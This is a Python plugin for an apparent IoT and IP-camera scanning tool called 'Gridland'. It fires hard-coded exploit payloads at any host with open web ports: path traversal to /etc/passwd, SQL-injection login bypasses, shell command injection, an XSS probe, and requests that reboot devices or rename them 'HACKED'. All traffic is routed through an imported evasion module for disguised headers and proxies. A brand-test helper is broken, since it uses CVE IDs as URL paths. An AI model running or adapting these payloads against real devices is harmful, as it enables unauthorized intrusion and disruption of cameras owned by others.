"""
Vulnerability Scanner Plugin for Gridland
Detects known CVEs and security vulnerabilities in IP cameras and IoT devices
"""
import requests
import re
from typing import List, Dict, Any
from lib.plugins import ScannerPlugin, Finding
from lib.core import ScanTarget
from lib.evasion import get_request_headers, get_proxies
import os
import json
import time
from datetime import datetime, timedelta

CISA_KEV_URL = "https://www.cisa.gov/known-exploited-vulnerabilities-catalog/known-exploited-vulnerabilities.json"
CVE_CACHE_FILE = "cve_cache.json"
CACHE_DURATION_HOURS = 24


def update_cve_database() -> Dict:
    """
    Fetches the CISA Known Exploited Vulnerabilities (KEV) catalog and caches it.
    Updates the cache only if it's older than CACHE_DURATION_HOURS.
    """
    cache_exists = os.path.exists(CVE_CACHE_FILE)
    if cache_exists:
        last_modified_time = datetime.fromtimestamp(os.path.getmtime(CVE_CACHE_FILE))
        if datetime.now() - last_modified_time < timedelta(hours=CACHE_DURATION_HOURS):
            with open(CVE_CACHE_FILE, 'r') as f:
                return json.load(f)

    try:
        response = requests.get(CISA_KEV_URL, timeout=15)
        response.raise_for_status()
        data = response.json()
        with open(CVE_CACHE_FILE, 'w') as f:
            json.dump(data, f)
        return data
    except (requests.RequestException, json.JSONDecodeError) as e:
        print(f"Error updating CVE database: {e}")
        if cache_exists:
            with open(CVE_CACHE_FILE, 'r') as f:
                return json.load(f)
        return {}


class VulnerabilityScannerPlugin(ScannerPlugin):
    """
    Comprehensive vulnerability detection for IP cameras and IoT devices.
    Tests for known CVEs, authentication bypasses, and common exploits.
    """
    
    def can_scan(self, target: ScanTarget) -> bool:
        """Check if target has web ports for vulnerability testing"""
        vuln_ports = [80, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8083, 8084, 8085]
        return any(p.port in vuln_ports for p in target.open_ports)

    # Known vulnerability signatures and exploit paths
    VULNERABILITY_TESTS = {
        # Directory Traversal Vulnerabilities
        "directory_traversal": {
            "paths": [
                "/cgi-bin/hi3510/param.cgi?cmd=getserverinfo&-usr=admin&-pwd=admin&-file=../../../../etc/passwd",
                "/ISAPI/Security/sessionLogin/capabilities?username=admin'%20or%20'1'='1&password=admin",
                "/cgi-bin/nobody/VerifyCode.cgi?account=admin'or'1=1'%23",
                "/../../../../../../../etc/passwd",
                "/cgi-bin/supervisor.cgi?action=logincheck&user=admin&password=../../../../etc/passwd%00",
                "/axis-cgi/jpg/image.cgi?resolution=640x480&dummy=../../../../../../../etc/passwd"
            ],
            "indicators": ["root:", "daemon:", "nobody:", "www-data:", "passwd"],
            "severity": "critical",
            "description": "Directory traversal vulnerability allows reading system files"
        },
        
        # Authentication Bypass Vulnerabilities  
        "auth_bypass": {
            "paths": [
                "/cgi-bin/nobody/Machine.cgi?action=list",
                "/ISAPI/Security/userCheck",
                "/cgi-bin/hi3510/checkuser.cgi?&-name=admin&-passwd=",
                "/axis-cgi/admin/param.cgi?action=list&group=Network",
                "/admin/admin_testip.php",
                "/cgi-bin/operator/admin.cgi",
                "/sony/admin",
                "/panasonic/admin"
            ],
            "indicators": ["<admin>", "authentication", "login successful", "admin panel", "configuration"],
            "severity": "high",
            "description": "Authentication bypass allows unauthorized access"
        },
        
        # Command Injection Vulnerabilities
        "command_injection": {
            "paths": [
                "/cgi-bin/hi3510/test.cgi?cmd=cat%20/etc/passwd",
                "/cgi-bin/nobody/Machine.cgi?action=shellcommand&command=id",
                "/ISAPI/System/deviceInfo?devInfo=%22%3e%3cscript%3ealert(%27xss%27)%3c/script%3e",
                "/axis-cgi/admin/param.cgi?action=update&root.Network.Interface.I0.IPv4.Address=`id`",
                "/cgi-bin/supervisor.cgi?action=&command=id;"
            ],
            "indicators": ["uid=", "gid=", "groups=", "root", "daemon"],
            "severity": "critical", 
            "description": "Command injection vulnerability allows remote code execution"
        },
        
        # Information Disclosure
        "info_disclosure": {
            "paths": [
                "/cgi-bin/hi3510/param.cgi?cmd=getserverinfo",
                "/ISAPI/System/deviceInfo",
                "/axis-cgi/admin/param.cgi?action=list",
                "/cgi-bin/nobody/Machine.cgi?action=list",
                "/sony/common/appInfo.cgi",
                "/panasonic/config/config_backup.bin",
                "/admin/system_log.cgi",
                "/cgi-bin/supervisor.cgi?action=get&category=system.*"
            ],
            "indicators": ["version", "model", "serial", "firmware", "password", "key"],
            "severity": "medium",
            "description": "Information disclosure reveals sensitive system details"
        },
        
        # CSRF Vulnerabilities
        "csrf": {
            "paths": [
                "/admin/admin_testip.php?ip=127.0.0.1",
                "/cgi-bin/nobody/Machine.cgi?action=reboot",
                "/ISAPI/System/reboot",
                "/axis-cgi/admin/param.cgi?action=update&root.System.Name=HACKED"
            ],
            "indicators": ["success", "rebooting", "updated", "changed"],
            "severity": "medium",
            "description": "CSRF vulnerability allows unauthorized actions"
        }
    }

    # Brand-specific vulnerability tests
    BRAND_SPECIFIC_VULNS = {
        "hikvision": ["CVE-2017-7921"],
        "dahua": ["CVE-2013-6117"],
        # Add more CVEs and their corresponding brands here
    }

    def _test_specific_cve(self, base_url: str, cve_id: str, proxy_url: str = None) -> bool:
        """
        Tests for a specific CVE based on its ID. Acts as a dispatcher.
        Returns True if the vulnerability is confirmed, False otherwise.
        """
        test_functions = {
            "CVE-2017-7921": self._test_cve_2017_7921,
            "CVE-2013-6117": self._test_cve_2013_6117,
        }
        test_function = test_functions.get(cve_id)
        if test_function:
            return test_function(base_url, proxy_url)
        return False

    def _test_cve_2017_7921(self, base_url: str, proxy_url: str = None) -> bool:
        """Tests for Hikvision unauthenticated access (CVE-2017-7921)."""
        url = f"{base_url}/ISAPI/Security/userCheck"
        try:
            response = requests.get(
                url,
                timeout=5,
                verify=False,
                allow_redirects=True,
                headers=get_request_headers(),
                proxies=get_proxies(proxy_url)
            )
            return response.status_code == 200
        except requests.RequestException:
            return False

    def _test_cve_2013_6117(self, base_url: str, proxy_url: str = None) -> bool:
        """Tests for Dahua config download (CVE-2013-6117)."""
        url = f"{base_url}/current_config/passwd"
        try:
            response = requests.get(
                url,
                timeout=5,
                verify=False,
                allow_redirects=True,
                headers=get_request_headers(),
                proxies=get_proxies(proxy_url)
            )
            return response.status_code == 200
        except requests.RequestException:
            return False

    def scan(self, target: ScanTarget, fingerprint: dict = None) -> List[Finding]:
        """Perform intelligence-led vulnerability scanning."""
        findings = []
        proxy_url = os.environ.get('PROXY_URL')

        vendor = fingerprint.get('vendor') if fingerprint else None

        cve_data = update_cve_database()

        for port_result in target.open_ports:
            if port_result.port not in [80, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8083, 8084, 8085]:
                continue

            protocol = "https" if port_result.port in [443, 8443] else "http"
            base_url = f"{protocol}://{target.ip}:{port_result.port}"

            # 1. Run generic, high-impact tests on all targets
            for vuln_type, vuln_data in self.VULNERABILITY_TESTS.items():
                findings.extend(self._test_vulnerability(base_url, vuln_type, vuln_data, proxy_url))

            # 2. Run targeted CVE checks based on fingerprint
            if vendor and cve_data and 'vulnerabilities' in cve_data:
                vendor_lower = vendor.lower()

                for vuln in cve_data['vulnerabilities']:
                    cve_vendor = vuln.get('vendor', '').lower()

                    # Only test vulnerabilities relevant to the identified vendor
                    if cve_vendor == vendor_lower:
                        cve_id = vuln.get('cveID')
                        if self._test_specific_cve(base_url, cve_id, proxy_url):
                            finding = Finding(
                                category="vulnerability",
                                description=f"Confirmed CISA KEV match for {vendor}: {cve_id}",
                                severity="critical",
                                port=port_result.port,
                                url=base_url,
                                data={ "cveID": cve_id, "vendor": vendor }
                            )
                            findings.append(finding)
        
        return findings

    def _test_vulnerability(self, base_url: str, vuln_type: str, vuln_data: Dict[str, Any], proxy_url: str = None) -> List[Finding]:
        """Test a specific vulnerability type"""
        findings = []
        
        for path in vuln_data["paths"]:
            try:
                url = f"{base_url}{path}"
                response = requests.get(
                    url,
                    timeout=5,
                    verify=False,
                    allow_redirects=True,
                    headers=get_request_headers(),
                    proxies=get_proxies(proxy_url)
                )
                
                if response.status_code == 200:
                    content = response.text.lower()
                    
                    # Check for vulnerability indicators
                    for indicator in vuln_data["indicators"]:
                        if indicator.lower() in content:
                            finding = Finding(
                                category="vulnerability",
                                description=f"{vuln_data['description']} - {vuln_type}",
                                severity=vuln_data["severity"],
                                url=url,
                                data={
                                    "vulnerability_type": vuln_type,
                                    "indicator_found": indicator,
                                    "response_snippet": content[:200]
                                }
                            )
                            findings.append(finding)
                            break  # Only report once per path
                            
            except requests.RequestException:
                continue
                
        return findings

    def _test_brand_vulnerabilities(self, base_url: str, brand: str, brand_display: str, proxy_url: str = None) -> List[Finding]:
        """Test brand-specific known vulnerabilities"""
        findings = []
        
        for path in self.BRAND_SPECIFIC_VULNS.get(brand, []):
            try:
                url = f"{base_url}{path}"
                response = requests.get(
                    url,
                    timeout=5,
                    verify=False,
                    allow_redirects=True,
                    headers={'User-Agent': 'Mozilla/5.0 Security Scanner'}
                )
                
                # Different success criteria for different brands
                success_indicators = {
                    "hikvision": ["<ResponseStatus>", "deviceInfo", "userCheck"],
                    "dahua": ["admin:", "config", "passwd"],
                    "axis": ["root.", "Network", "System"],
                    "sony": ["appInfo", "sony", "version"]
                }
                
                if response.status_code == 200:
                    content = response.text.lower()
                    indicators = success_indicators.get(brand, ["admin", "config", "system"])
                    
                    for indicator in indicators:
                        if indicator.lower() in content:
                            finding = Finding(
                                category="vulnerability",
                                description=f"{brand_display}-specific vulnerability found",
                                severity="high",
                                url=url,
                                data={
                                    "vulnerability_type": f"{brand}_specific",
                                    "brand": brand_display,
                                    "indicator_found": indicator
                                }
                            )
                            findings.append(finding)
                            break
                            
            except requests.RequestException:
                continue
                
        return findings

    def get_description(self) -> str:
        """Get plugin description"""
        return "Comprehensive vulnerability scanner for IP cameras and IoT devices"